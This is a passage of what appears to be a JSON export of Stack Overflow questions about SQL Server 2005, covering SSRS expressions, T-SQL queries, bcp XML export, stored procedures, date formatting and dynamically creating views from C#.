SEEK:([bp].[ForeignPhone]=(0)),  WHERE:(([Service_Prod].[dbo].[BorrowerPhone].[PhoneType] as [bp].[PhoneType]=(0) OR [Service_Prod].[dbo].[BorrowerPhone].[PhoneType] as [bp].[PhoneType]=(1)) AND PROBE([Bitmap1068],[Service_Prod].[dbo].[BorrowerPhone].[LoanID] as [bp].[LoanID],[Service_Prod].[dbo].[BorrowerPhone].[AssmRecCounter] as [bp].[AssmRecCounter],[Service_Prod].[dbo].[BorrowerPhone].[BorrowerID] as [bp].[BorrowerID])) ORDERED FORWARD)\n</code></pre>\n"},{"tags":["sql-server-2005","reporting-services"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":701,"score":1,"question_id":10837399,"title":"Using Like Operator in SSRS 2005 IIF Expression","body":"<p>I have a pretty complicated IIF expression in SSRS, in which I want to change the background color of the cell will change based on certain conditions.  It works fine in its current state, but I am trying to add a Like condition to it... </p>\n\n<p>so, here's what it looks like now (working):   </p>\n\n<pre><code> =IIf(inscope(\"matrix1_errorType\"), \n\nIIf(\n\n(\n    FormatPercent(Sum(Fields!numberOfIssues.Value)/First(Fields!totalItems.Value),3) &gt;= .0001 &amp; \"%\" \n    And ( First(Fields!errorType.Value) = \"TypeA\")\n)\n\nOr \n(\n    FormatPercent(Sum(Fields!numberOfIssues.Value)/First(Fields!totalItems.Value),3) &gt;= .04 &amp; \"%\" \n    And First(Fields!errorType.Value) = \"TypeB\"\n)\n\nOr \n(\n    FormatPercent(Sum(Fields!numberOfIssues.Value)/First(Fields!totalItems.Value),3) &gt;= .02 &amp; \"%\" \n    And First(Fields!errorType.Value) = \"TypeC\"\n    )\n,\n\"Maroon\", \"Transparent\")\n, \"Transparent\")\n</code></pre>\n\n<p>What I would like to do is add a Like type statement somewhere in this line, which would say ...and location LIKE \"Scan\" - in other words, a location with \"Scan\" somewhere in the title.  locationName is a field i display in the report as well.</p>\n\n<pre><code>(\n    FormatPercent(Sum(Fields!numberOfIssues.Value)/First(Fields!totalItems.Value),3) &gt;= .0001 &amp; \"%\" \n    And ( First(Fields!errorType.Value) = \"TypeA\")\n)\n</code></pre>\n\n<p>The like statement would be something similar to:  </p>\n\n<pre><code>... And ( First(Fields!errorType.Value) = \"TypeA\") And First(Fields!locationName.Value) Like \"*Scan*\"\n</code></pre>\n\n<p>but that doesn't work.  I've also tried:</p>\n\n<pre><code>And ( First(Fields!errorType.Value) = \"TypeA\" And First(Fields!locationName.Value.ToString().Contains(\"Scan\")\n</code></pre>\n\n<p>Which doesn't work either.</p>\n\n<p>Any way I can do this in an SSRS 2005 expression?<br>\nThanks!</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":151,"score":3,"question_id":10735407,"title":"sql server : create indexes on foreign keys where necessary","body":"<p>I have lots of tables with foreign keys and some have an index while others have not.\nAll foreign keys are named <code>FK_&lt;name of the foreign key&gt;</code> with indexes named <code>IX_&lt;name of the foreign key&gt;</code>.</p>\n\n<p>Are there some good practices, given the column cardinality of the foreign key, to create (or not) indexes ?\nCould this be scripted as T-SQL commands ? </p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":65,"score":0,"question_id":10836452,"title":"How to find which column value is differ after using except command","body":"<p>I have two tables. Using \"except\" command I can find the mismatch values between two tables.</p>\n\n<p>EX: </p>\n\n<pre><code>(select * from test_table3) except (select * from test_table1)\n</code></pre>\n\n<p>Now I need to find the difference in which column's value? How can i find that column?\nI am using SQL 2005.</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":642,"score":1,"question_id":6233060,"title":"SQL Server 2005 find all columns in database for a certain datatype","body":"<p>Is there a way to query the system tables to find all the columns in a database that has a certain datatype.  </p>\n\n<p>For example if I needed to know the table name and the column where the datatype = <code>ntext</code></p>\n\n<p>Is there a way to do that?</p>\n"},{"tags":["sql","sql-server-2005","query","table"],"answer_count":6,"favorite_count":0,"up_vote_count":0,"down_vote_count":6,"view_count":463,"score":-6,"question_id":6203157,"title":"How to run two separate queries in SQL","body":"<p>I would like to know how to run two separate queries using sql in Microsoft server management studio. I would like to have a space between the two is this possible?</p>\n\n<pre><code>select this that and the other\nFrom tbl\n\nselect this that and the other\nfrom tbl\n</code></pre>\n\n<p>returns...</p>\n\n<pre><code>query 1\n\nquery 2\n</code></pre>\n"},{"tags":["sql-server","sql-server-2005","floating-point"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":771,"score":0,"question_id":6512046,"title":"Why casting from float to varchar is being rounded in SQL Server","body":"<p>Following sql</p>\n\n<pre><code>declare @a as float, @b as float\n\nselect @a=1.353954 , @b=1.353956\nselect \nCAST(@a as VARCHAR(40)) AS a_float_to_varchar ,\nCAST(@b as VARCHAR(40)) AS b_float_to_varchar\n</code></pre>\n\n<p>results in </p>\n\n<pre><code>a_float_to_varchar                       b_float_to_varchar\n---------------------------------------- ----------------------------------------\n1.35395                                  1.35396\n</code></pre>\n\n<p>based on </p>\n\n<p><a href=\"http://msdn.microsoft.com/en-us/library/ms173773.aspx\" rel=\"nofollow\">http://msdn.microsoft.com/en-us/library/ms173773.aspx</a></p>\n\n<p>float has precision of 15 digits so I am not sure why the number is being rounded when converted to varchar</p>\n"},{"tags":["c#","sql-server-2005","linq-to-sql"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":192,"score":0,"question_id":10832215,"title":".mdf file does not respond to SqlCommand.ExecuteNonQuery","body":"<p>I have a weird problem with my local database. I added it as a <code>.mdf</code> file, and created 2 tables in it. </p>\n\n<p>I tested the connection and the message box states that the connection is working properly. </p>\n\n<p>The problem appears when I try to insert data into that database from my C# application. I tried 2 different ways:</p>\n\n<ol>\n<li>By using <code>SqlCommand.ExecuteNonQuery(\"INSERT INTO ....\")</code></li>\n<li>By using <code>.dbml</code> file (Linq-to-SQL) datacontext</li>\n</ol>\n\n<p>When I try to insert data, no error is thrown, but no data is inserted into the database either. What could be the problem?</p>\n\n<p>I'm using C# in VS 2010 and SQL Server 2005 to make my application</p>\n"},{"tags":["xml","sql-server-2005","bcp"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":527,"score":0,"question_id":4938826,"title":"Host-file colums may be skipped only when copying into the server","body":"<p>I want to create a xml file from my database with bcp.</p>\n\n<p>The following code works in SQL Server 2008 but not in SQl Express 2005.</p>\n\n<p>This is the code error:\n<code>SQLState = S1000, NativeError = 0\nError = [Microsoft][SQL Native Client] Host-file columns may be skipped only when copying into the Server</code></p>\n\n<p>These are Sql Express info:\nMicrosoft SQL Server Management Studio Express: 9.00.4035.00</p>\n\n<p>Microsoft Data Access Components (MDAC): 2000.085.1132.00 (xpsp.080413-0852)</p>\n\n<p>Microsoft MSXML: 2.6 3.0 4.0 5.0 6.0</p>\n\n<p>Microsoft Internet Explorer 8.0.6001.18702</p>\n\n<p>Microsoft .NET Framework: 2.0.50727.3615</p>\n\n<p>SO: 5.1.2600</p>\n\n<p>This is my code:</p>\n\n<pre><code>DECLARE @FileName VARCHAR(150)\nDECLARE @dataExport AS DATETIME\nDECLARE @param VARCHAR(8)\n\nSET @FileName = 'c:\\BackupSql\\XMLOutput.xml'\nSET @dataExport = '20110122'\nSET @param = 'XXX'\n\nDECLARE @SQLCmd VARCHAR(1800)\n\nSELECT @SQLCmd = 'bcp ' + \n'\"DECLARE @xml as xml; ' +\n'DECLARE @text varchar(MAX); ' +             \n'SET @xml = (select ' +\n'(select ''' + convert(varchar(10), @dateExport, 112) + ''' as DateExport ' +\n'FOR XML PATH (''DATA''), TYPE), ' + \n'(select ' +\n    '(select Item as ITEM, cast(Quantity as int) as QTY, \nconvert(decimal(10,6), Price) as PRICE, ''0.0'' as TOTAL, convert(varchar(10), DateInv, 112) as DATE from '+ DB_NAME() +'.dbo.ITEMS where (ITEM not like ''X-%'' and ITEM not like ''Y-%'') and DateInv = ''' + convert(varchar(10), @dateExport, 112) + ''' ' +\n        'FOR XML PATH(''LINE''), TYPE) ' +\n    'FOR XML PATH(''BODY''), TYPE) ' +\n    'FOR XML PATH (''''), ' +\n    'ROOT(''MYROOT''), TYPE); ' +\n'SET @text = REPLACE(CAST(@xml AS varchar(max)), ''&gt;&lt;'', ''&gt;'' + CHAR(13) + CHAR(10) + ''&lt;''); ' +\n'SELECT @text\" ' + \n' queryout ' +\n@FileName + ' -c -T -S' + convert(varchar(128), serverproperty('servername')) --Trustedonnection e ANSI\n\nEXECUTE master..xp_cmdshell @SQLCmd\n</code></pre>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":89,"score":1,"question_id":10831200,"title":"Delete all rows from a SQL Server 2005 database","body":"<p>I want to delete all rows from a SQL Server 2005 database.</p>\n\n<p>Can anyone to define a procedure to delete all rows from database easily?</p>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":139,"score":0,"question_id":10831753,"title":"Delete all rows from database by using single query?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/1899846/how-to-delete-all-rows-from-all-tables-in-a-sql-server-database\">How to delete all rows from all tables in a SQL Server database?</a>  </p>\n</blockquote>\n\n\n\n<p>I want to delete all rows from a SQL Server 2005 database.</p>\n\n<p>Can anyone to define a procedure to delete all rows from database by using single query?</p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":40,"score":3,"question_id":10830332,"title":"SQL Query To Flip The Values And Make It A Field In A New Table","body":"<p>I have this table below</p>\n\n<p><img src=\"http://i.stack.imgur.com/apkEo.jpg\" alt=\"enter image description here\"></p>\n\n<p>How do I make the output like this</p>\n\n<p><img src=\"http://i.stack.imgur.com/kEkHH.jpg\" alt=\"enter image description here\"></p>\n\n<p>I did the output above using this query:</p>\n\n<pre><code>SELECT DISTINCT \n    C.RefVal, \n    C.CalibrationEventID, \n    C1.Result As \"Trial One\", \n    C2.Result AS \"Trial Two\", \n    C3.Result AS \"Trial Three\", \n    C4.Result AS \"Trial Four\", \n    C5.Result AS \"Trial Five\" \nFROM CalibrationTrials AS C \nINNER JOIN \n    (SELECT DISTINCT RefVal, Result FROM CalibrationTrials WHERE CalibrationEventID = 'CAL000001' AND RefVal = '1.0010'AND TrialNo = 1) As C1 \nON C1.RefVal = C.RefVal\nINNER JOIN \n    (SELECT DISTINCT RefVal, Result FROM CalibrationTrials WHERE CalibrationEventID = 'CAL000001' AND RefVal = '1.0010'AND TrialNo = 2) As C2 \nON C2.RefVal = C.RefVal\nINNER JOIN \n    (SELECT DISTINCT RefVal, Result FROM CalibrationTrials WHERE CalibrationEventID = 'CAL000001' AND RefVal = '1.0010'AND TrialNo = 3) As C3 \nON C3.RefVal = C.RefVal\nINNER JOIN \n    (SELECT DISTINCT RefVal, Result FROM CalibrationTrials WHERE CalibrationEventID = 'CAL000001' AND RefVal = '1.0010'AND TrialNo = 4) As C4 \nON C4.RefVal = C.RefVal\nINNER JOIN \n    (SELECT DISTINCT RefVal, Result FROM CalibrationTrials WHERE CalibrationEventID = 'CAL000001' AND RefVal = '1.0010'AND TrialNo = 5) As C5 \nON C5.RefVal = C.RefVal\n\nWHERE C.CalibrationEventID = 'CAL000001' AND C.RefVal = '1.0010'\nORDER BY C.RefVal, C.CalibrationEventID\n</code></pre>\n\n<p>Apparently with this query the output is only fixed to one RefVal which is '1.0010'</p>\n\n<p>What would be the correct query to output image2 format for each RefVal of a CalibrationEventID?</p>\n"},{"tags":["sql","tsql","sql-server-2005"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":128,"score":1,"question_id":10810827,"title":"Difference between IN and JOIN","body":"<p>I was wondering what was the difference between the two queries mentioned below, because the first one takes more than 10 seconds to execute on the server and the second one executes in less than one second...</p>\n\n<p><strong>UPDATE - I</strong>\nHere are the actual queries and their Execution Plans as copied and pasted from SQL Server (as is), sorry for any inconvenience caused by my previous queries... :(</p>\n\n<pre><code>SELECT  REPLACE(CONVERT(VARCHAR(11), m.PlanDate, 106), ' ', '-') AS ManagmentPlanDate\nFROM    ManagmentPlan m\n        INNER JOIN Product p ON p.Product_ID = m.ProductID\n        INNER JOIN Category c ON c.C_ID = p.C_ID\n        LEFT OUTER JOIN Employee e ON e.emp_no = m.PrescribedBy\n        LEFT OUTER JOIN dbo.Issue_Stock i ON i.serial_no = m.IssueStockID\n        INNER JOIN dbo.Units u ON u.U_ID = p.U_ID\nWHERE   ( ( @PatientID IS NULL )\n          AND ( @VisitID IS NULL )\n          AND ( m.WardRegNo = @WardRegNo )\n        )\n        OR --Get only cuurent admission TP \n        ( ( @PatientID IS NULL )\n          AND ( @WardRegNo IS NULL )\n          AND ( VisitID = @VisitID\n                AND m.WardRegNo IS NULL\n              )\n        )\n        OR -- Get Only Current OPD visit TP \n        ( ( @WardRegNo IS NULL )\n          AND ( @VisitID IS NULL )\n          AND ( visitid IN ( SELECT id\n                             FROM   PatientVisit\n                             WHERE  PatientID = @PatientID ) )\n        )\n        OR --Get All Visits TP\n        ( ( @PatientID IS NULL )\n          AND ( @VisitID IS NOT NULL )\n          AND ( @WardRegNo IS NOT NULL )\n          AND ( ( VisitID = @VisitID )\n                OR ( m.WardRegNo = @WardRegNo )\n              )\n        ) -- Get Current OPD visit and cuurent admission TP (Both)\n        AND m.Deleted != 1\n        AND m.PatientDeptID = @PatientDeptID\nGROUP BY REPLACE(CONVERT(VARCHAR(11), m.PlanDate, 106), ' ', '-')\nORDER BY CAST(REPLACE(CONVERT(VARCHAR(11), m.PlanDate, 106), ' ', '-') AS DATETIME) DESC\n</code></pre>\n\n<p><img src=\"http://i.stack.imgur.com/o3YCd.png\" alt=\"Execution Plan of the first Query\"></p>\n\n<p>and</p>\n\n<pre><code>SELECT  REPLACE(CONVERT(VARCHAR(11), m.PlanDate, 106), ' ', '-') AS ManagmentPlanDate\nFROM    ManagmentPlan m\nWHERE   m.ProductID IN ( SELECT Product_ID\n                         FROM   Product\n                         WHERE  C_ID IN ( SELECT    C_ID\n                                          FROM      Category )\n                                AND U_ID IN ( SELECT    U_ID\n                                              FROM      Units ) )\n        AND m.PrescribedBy IN ( SELECT  Emp_no\n                                FROM    Employee )\n        AND m.IssueStockID IN ( SELECT  Serial_No\n                                FROM    Issue_Stock )\n        AND ( ( @PatientID IS NULL )\n              AND ( @VisitID IS NULL )\n              AND ( m.WardRegNo = @WardRegNo )\n            )\n        OR --Get only cuurent admission TP \n        ( ( @PatientID IS NULL )\n          AND ( @WardRegNo IS NULL )\n          AND ( VisitID = @VisitID\n                AND m.WardRegNo IS NULL\n              )\n        )\n        OR -- Get Only Current OPD visit TP \n        ( ( @WardRegNo IS NULL )\n          AND ( @VisitID IS NULL )\n          AND ( visitid IN ( SELECT id\n                             FROM   PatientVisit\n                             WHERE  PatientID = @PatientID ) )\n        )\n        OR --Get All Visits TP\n        ( ( @PatientID IS NULL )\n          AND ( @VisitID IS NOT NULL )\n          AND ( @WardRegNo IS NOT NULL )\n          AND ( ( VisitID = @VisitID )\n                OR ( m.WardRegNo = @WardRegNo )\n              )\n        ) -- Get Current OPD visit and cuurent admission TP (Both)\n        AND m.Deleted != 1\n        AND m.PatientDeptID = @PatientDeptID\nGROUP BY REPLACE(CONVERT(VARCHAR(11), m.PlanDate, 106), ' ', '-')\nORDER BY CAST(REPLACE(CONVERT(VARCHAR(11), m.PlanDate, 106), ' ', '-') AS DATETIME) DESC\n</code></pre>\n\n<p><img src=\"http://i.stack.imgur.com/22J75.png\" alt=\"enter image description here\"></p>\n\n<p>Although, it solved my problem of speed or optimization of the query, but just was curious as to what exactly is the difference between those two queries, as I thought the first one translates to the second one...</p>\n\n<p><strong>UPDATE - I</strong>\nAs you can see, both queries differ in only the <strong>JOINS</strong> converted to <strong>IN</strong> statements...</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005"],"answer_count":3,"favorite_count":1,"up_vote_count":4,"down_vote_count":1,"view_count":91,"score":3,"question_id":10818115,"title":"Cell to Cell comparison in Sql Server?","body":"<p>I have <code>tbl1</code> : </p>\n\n<pre><code>   Id  | c1  |  c2  |  c3   |\n   ____|_____|______|_______|_\n    1     a     b       c \n   ____|_____|______|_______|_\n    2     h     j       k\n   ____|_____|______|_______|_\n    3     t     y       u\n   ____|_____|______|_______|_\n</code></pre>\n\n<p>I have <code>tbl2</code> : </p>\n\n<pre><code>   Id  | c1  |  c2  |  c3   |\n   ____|_____|______|_______|_\n    1     a     b       D \n   ____|_____|______|_______|_\n    2     c     c       c\n   ____|_____|______|_______|_\n    3     k     l       k\n   ____|_____|______|_______|_\n</code></pre>\n\n<p>I need to compare each cell from <code>tbl1</code> to its appropriate place in <code>tbl2</code> : </p>\n\n<p>the desired output is : </p>\n\n<pre><code>   Id  |tbl1 | tbl2 | \n   ____|_____|______| \n    1     a     a     \n   ____|_____|______| \n    1     b     b      \n   ____|_____|______| \n    1     c     d      \n   ____|_____|______| \n    2     h     c     \n   ____|_____|______| \n    2     j     c      \n   ____|_____|______| \n    2     k     c      \n   ____|_____|______| \n          ...\n          ...\n          ...\n          ...\n</code></pre>\n\n<p><strong>visual representation :</strong> </p>\n\n<p><img src=\"http://i.stack.imgur.com/uXa9D.jpg\" alt=\"enter image description here\"></p>\n\n<p>i tried many queries... but not succeed...</p>\n"},{"tags":["sql-server-2005","database-design","architecture","stored-procedures"],"answer_count":7,"favorite_count":1,"up_vote_count":7,"down_vote_count":0,"view_count":172,"score":7,"question_id":1241159,"title":"Version changes for Stored Procedures","body":"<p>I have an application that relies very heavily on stored procedures (SQL 2005/2008).  We are doing a minor update that will modify 25-35 of these stored procedures.  The application is such that both versions of the stored procedure must be available.</p>\n\n<p>This is major version 4 of the application and usually we've been able to completely modify the data structure to go with each new version.  However in this case, we cannot do that.</p>\n\n<p>Here are my 2 options I've come up with</p>\n\n<ol>\n<li><p>Make a \"2\" version of each stored procedure.  If I had a procedure called getUser create a getUser2.  The downside of this is that the # of stored procedures will grow exponentially with each version change</p></li>\n<li><p>Add a @version parameter to each stored procedure that defaults to v1.  This would keep the number of stored procedures down but would bloat each stored procedure</p></li>\n</ol>\n\n<p>Anyone have any thoughts on this?  Any other clever ideas?</p>\n\n<p>Cody</p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005","self-join"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":62,"score":-1,"question_id":10824810,"title":"Find repeat datetimes within X secs - Returning duplicate times","body":"<p>The query I am using is:</p>\n\n<pre><code>SELECT  \n a.What_Tech,  \n a.callid FirstCallid,  \n b.Callid SecondCallid,  \n a.[segStart_dateTime] FirstCallTime,  \n b.[segStart_dateTime] SecondCallTime,  \n DateDiff(second, a.[segStart_dateTime], b.[segStart_dateTime]) as [myDiff]  \nFROM CallVolume.AreaGeneratedActivity a\nJOIN CallVolume.AreaGeneratedActivity b on  \n  a.calling_pty = b.calling_pty  \n  and a.[segStart_dateTime] &lt; b.[segStart_dateTime]  \n  and dbo.getdateonly(a.segStart_dateTime) = dbo.getdateonly(b.segStart_dateTime)  \nWHERE ABS(DateDiff(second, a.[segStart_dateTime], b.[segStart_dateTime])) &gt; 60  \n  and ABS(DateDiff(second, a.[segStart_dateTime], b.[segStart_dateTime])) &lt;= 1800\n</code></pre>\n\n<p>and what is being returned is:</p>\n\n<pre>|What_Tech|FirstCallid|SecondCallid|FirstCallTime|SecondCallTime|myDiff\n|  Tech1  |  21134601 |  21136023  |   09:19:41  |   09:20:43   |  62\n|  Tech1  |  21134601 |  21134507  |   09:19:41  |   09:19:41   |  886\n|  Tech1  |  21134601 |  21134602  |   09:19:41  |   09:34:27   |  887\n</pre>\n\n<p>What I want is different FirstCallids:</p>\n\n<pre>|What_Tech|FirstCallid|SecondCallid|FirstCallTime|SecondCallTime|myDiff\n|  Tech1  |  21134601 |  21134676  |  09:19:41   |    09:20:43  |  62\n|  Tech1  |  21136023 |  21136024  |  09:34:27   |    09:35:27  |  1\n</pre>\n\n<p>Here is some sample data from the table:</p>\n\n<pre><code>INSERT [dbo].[TestData](callid, What_Tech, segStart_dateTime, segStop_dateTime, duration)\nSELECT 21134601, N'Tech1', '20120307 09:19:41', '20120307 09:20:35', 54 UNION ALL\nSELECT 21134676, N'Tech1', '20120307 09:20:43', '20120307 09:21:30', 47 UNION  ALL\nSELECT 21136023, N'Tech1', '20120307 09:34:27', '20120307 09:36:54', 147 UNION ALL\nSELECT 21148838, N'Tech1', '20120307 12:00:29', '20120307 12:02:05', 96 UNION ALL\nSELECT 21149159, N'Tech1', '20120307 12:04:32', '20120307 12:05:46', 74 UNION ALL\nSELECT 21163170, N'Tech1', '20120307 14:50:08', '20120307 14:52:36', 148\n</code></pre>\n\n<p>Please note that the sample data from what is being returned and what I want are just examples and not directly from the sample data given in the INSERT statements</p>\n\n<hr>\n\n<p>The query posted (once I remove the join condition for <code>calling_party</code> which is missing from the <code>INSERT</code> and change the function call to an inline calculation) produces these results given the provided sample data:</p>\n\n<pre><code>What_Tech  FirstCallId  SecondCallId  FirstCallTime        SecondCallTime       myDiff\n---------  -----------  ------------  -------------------  -------------------  ------\nTech1      21134601     21134676      2012-03-07 09:19:41  2012-03-07 09:20:43  62\nTech1      21134601     21136023      2012-03-07 09:19:41  2012-03-07 09:34:27  886\nTech1      21134676     21136023      2012-03-07 09:20:43  2012-03-07 09:34:27  824\nTech1      21148838     21149159      2012-03-07 12:00:29  2012-03-07 12:04:32  243\n</code></pre>\n\n<p>Given that, can you please define what results you expect, given the actual sample data you've provided, instead of showing desired results from a slightly different set of data that we can't see?</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005","stored-procedures","parameters"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":417,"score":0,"question_id":10823966,"title":"Default parameter values in SQL Server 2008 stored procedure ","body":"<p>I want to use a stored procedure that can make some parameters with null value and then test it if the parameter is null or not and do some coding  :  I just want to know if there is any problem in this stored procedure </p>\n\n<p>This is the stored procedure </p>\n\n<pre><code>   create proc rechercherGIACetAffiche @nomgiac varchar(20),@nom varchar(30) = null,@par varchar(50) = null\n           as\n            begin\n            IF @nom is null and @par is null\n                begin\n                    select [ID_Dossier] as 'ID_Dossier'\n                      ,[ID_Entreprise] as 'ID_Entreprise'\n                      ,[Date_Depot] as 'Date_Dpt'\n                      ,[Type_Etude] as 'Type_Etude'\n                      ,[Dernier_Type] as 'Dernier_Type'\n                      ,[Eligibile] as 'Eligibilit'\n                      ,[Fiche_Information] as 'Fiche_Information'\n                      ,[Buletin_Adhesion] as 'Bulletin_dadhsion'\n                      ,[Fiche_Renseignment] as 'Fiche_Renseignment'\n                      ,[Attestation] as 'Attestation'\n                      ,[Date_Debut] as 'Date_Dbut'\n                      ,[Date_Fin] as 'Date_Fin'\n                      ,[ID_Cabinet] as 'ID_Cabinet'\n                      ,[Montant_Demander] as 'Montant_Demander'\n                      ,[Duree] as 'Dure'\n                      ,[Porcentage_Taux] as 'Pourcentage,Taux' from Dossier where Nom_Giac = @nomgiac\n                      return \n                end\n            if  @par is not null and @nom='CNSS' \n              begin\n              select d.[ID_Dossier] as 'ID_Dossier'\n              ,d.[ID_Entreprise] as 'ID_Entreprise'\n              ,[Date_Depot] as 'Date_Dpt'\n              ,[Type_Etude] as 'Type_Etude'\n              ,[Dernier_Type] as 'Dernier_Type'\n              ,[Eligibile] as 'Eligibilit'\n              ,[Fiche_Information] as 'Fiche_Information'\n              ,[Buletin_Adhesion] as 'Bulletin_dadhsion'\n              ,[Fiche_Renseignment] as 'Fiche_Renseignment'\n              ,[Attestation] as 'Attestation'\n              ,[Date_Debut] as 'Date_Dbut'\n              ,[Date_Fin] as 'Date_Fin'\n              ,[ID_Cabinet] as 'ID_Cabinet'\n              ,[Montant_Demander] as 'Montant_Demander'\n              ,[Duree] as 'Dure'\n              ,[Porcentage_Taux] as 'Pourcentage,Taux' \n              from dbo.Dossier d inner join entreprise e on d.ID_Entreprise=e.ID_Entreprise\n              where CNSS_Entreprise=@par and d.Nom_Giac=@nomgiac \n              return \n              end\n\n            else if @par is not null and @nom='RS'  \n              begin\n              select [ID_Dossier] as 'ID_Dossier'\n              ,[ID_Entreprise] as 'ID_Entreprise'\n              ,[Date_Depot] as 'Date_Dpt'\n              ,[Type_Etude] as 'Type_Etude'\n              ,[Dernier_Type] as 'Dernier_Type'\n              ,[Eligibile] as 'Eligibilit'\n              ,[Fiche_Information] as 'Fiche_Information'\n              ,[Buletin_Adhesion] as 'Bulletin_dadhsion'\n              ,[Fiche_Renseignment] as 'Fiche_Renseignment'\n              ,[Attestation] as 'Attestation'\n              ,[Date_Debut] as 'Date_Dbut'\n              ,[Date_Fin] as 'Date_Fin'\n              ,[ID_Cabinet] as 'ID_Cabinet'\n              ,[Montant_Demander] as 'Montant_Demander'\n              ,[Duree] as 'Dure'\n              ,[Porcentage_Taux] as 'Pourcentage,Taux'  \n              from dbo.Dossier \n              where  Nom_Giac=@nomgiac and ID_Entreprise in( select ID_Entreprise\n                                                             from dbo.Entreprise\n                                                             where Raison_Social=@par) \n                                                             return                                            \n              end\n           else if @par is not null and @nom ='Date'\n            begin\n             declare @v smalldatetime,@b smalldatetime\n              set @b=SUBSTRING(@par,1,4)\n              set @v=SUBSTRING(@par,5,8)\n            select [ID_Dossier] as 'ID_Dossier'\n              ,[ID_Entreprise] as 'ID_Entreprise'\n              ,[Date_Depot] as 'Date_Dpt'\n              ,[Type_Etude] as 'Type_Etude'\n              ,[Dernier_Type] as 'Dernier_Type'\n              ,[Eligibile] as 'Eligibilit'\n              ,[Fiche_Information] as 'Fiche_Information'\n              ,[Buletin_Adhesion] as 'Bulletin_dadhsion'\n              ,[Fiche_Renseignment] as 'Fiche_Renseignment'\n              ,[Attestation] as 'Attestation'\n              ,[Date_Debut] as 'Date_Dbut'\n              ,[Date_Fin] as 'Date_Fin'\n              ,[ID_Cabinet] as 'ID_Cabinet'\n              ,[Montant_Demander] as 'Montant_Demander'\n              ,[Duree] as 'Dure'\n              ,[Porcentage_Taux] as 'Pourcentage,Taux'  \n            from Dossier \n            where Date_Depot between @b and @v and Nom_Giac like @nomgiac\n           return \n            end \n            end\n</code></pre>\n"},{"tags":["c#","asp.net","sql-server-2005","crystal-reports"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":384,"score":0,"question_id":10818318,"title":"How to make bar chart using stored procedure values directly?","body":"<p><a href=\"http://stackoverflow.com/questions/10810642/query-to-select-the-month-and-nos-of-weekend-and-public-holiday-in-that-month\">Query to select the month and nos of weekend and public holiday in that month</a></p>\n\n<p>by using the select query in above link i have made a stored procedure in SQL Server 2005.</p>\n\n<p>Now I get the output (as an example) like this:</p>\n\n<pre><code>year      Month   count(weekendholiday)   count(publicholiday)\n----      -----   --------------   -------------\n2012      April      2               1\n2012      May        1               1\n2013      April      0               1\n</code></pre>\n\n<p>Can I use these values in Crystal Reports (asp.net C#) directly to make bar chart?</p>\n\n<p>I want specific year in X-axis and counts in Y-axis.</p>\n\n<p>There should be 2 bar which shows 1.nos. of weekend 2. nos. of public holiday</p>\n\n<p>How can I do that?</p>\n\n<p>Something like this:</p>\n\n<pre><code>  |\n 3|  \n  |          Weekend\n  |            -----\n 2|            |   |\n  |            |   |\n  |            |   |public\n 1|            |   |---    \n  |            |   |   |\n--|-----|---------|---------|----------|-------\n       3/2012   4/2012    5/2012      6/2012\n</code></pre>\n"},{"tags":["sql-server","tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":499,"score":2,"question_id":10822912,"title":"How can I format a datetime to varchar with the format dd-MMM-yyy","body":"<p>I feel this should be a simple solution but I'm having trouble finding anything on it...</p>\n\n<p>So: How do I get from a <code>datetime</code> to a <code>varchar</code> with the format dd-MMM-yyyy?</p>\n\n<pre><code>Eg: my_date --&gt; '29-May-2012'\n</code></pre>\n\n<p>The closes I've managed to come is</p>\n\n<pre><code>convert(varchar(20),my_date,105) --&gt; '29-05-2012'\n</code></pre>\n\n<p>Yes, I DO need to do this right in T-SQL.</p>\n"},{"tags":["c#","sql-server","sql-server-2005","ado.net"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":91,"score":0,"question_id":10822079,"title":"Creating a database view in code","body":"<p>So I've been tasked with creating a tool to allow ours users to create their own 'worklists' which they use to work through their data.  In our app these worklists are driven by SQL views, so for now my program is having to dynamically create views in our database based on the users input.  I don't like this, but for now I have to make the best of it an am brainstorming the best ways to go about this.</p>\n\n<p>Basically every view I create has a similar skeleton, it has several columns that are always pulled and several joins that always happens.  Based on the users input I may add additional SELECT columns, as well as additional joins if they are necessary to access the added display columns.</p>\n\n<p>So basically right now my code looks like this...</p>\n\n<pre><code>string SQL = string.Format(@\"CREATE VIEW {0}\n                             AS\n                             SELECT\n                             Foo.A,\n                             Bar.B,\n                             {1}\n                             FROM\n                             Table\n                             INNER JOIN Foo on Foo.ID = Table.FooID\n                             INNER JOIN Bar on Bar.ID = Table.BarID\n                             {2}\", viewName, displayNames, extraJoins);\nDatabase.ExecuteNonQuery(SQL);\n</code></pre>\n\n<p>I really don't like this for obvious reasons.  However, I cannot seem to find the equivalent of a parametrized query for view creation with ADO.  I could perhaps create a stored procedure to do this, but even that seems sloppy.  Is there any reasonable way to do something like this that doesn't make me 